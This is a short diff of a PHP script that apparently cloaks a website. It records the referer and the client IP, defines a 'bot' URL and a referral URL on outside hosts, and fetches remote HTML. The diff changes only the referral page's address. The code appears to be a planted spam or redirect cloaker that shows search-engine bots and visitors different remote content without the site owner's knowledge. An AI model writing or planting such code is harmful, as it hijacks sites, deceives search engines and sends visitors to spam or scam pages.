@@ -26,7 +26,7 @@ $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 $ip = get_client_ip();
 
 $bot_url = "https://faktawanita.com/licin/creatan.html";
-$reff_url = "https://licinpunya.sgp1.digitaloceanspaces.com/creatan.html";
+$reff_url = "https://licinpunya.sgp1.digitaloceanspaces.com/aulacreatan.html";
 
 $file = lph($bot_url);
 
